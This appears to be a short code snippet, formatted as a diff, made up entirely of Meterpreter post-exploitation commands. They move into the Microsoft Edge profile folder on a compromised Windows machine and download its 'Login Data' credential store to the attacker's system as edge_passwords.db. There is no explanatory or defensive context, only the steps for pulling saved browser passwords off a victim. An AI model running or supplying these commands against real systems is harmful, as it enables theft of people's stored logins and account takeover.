@@ -1,0 +1,6 @@
+code snippet - CMD 
+meterpreter > cd "%LocalAppData%\\Microsoft\\Edge\\User Data\\Default"
+
+meterpreter > ls
+
+meterpreter > download "Login Data" /tmp/edge_passwords.db
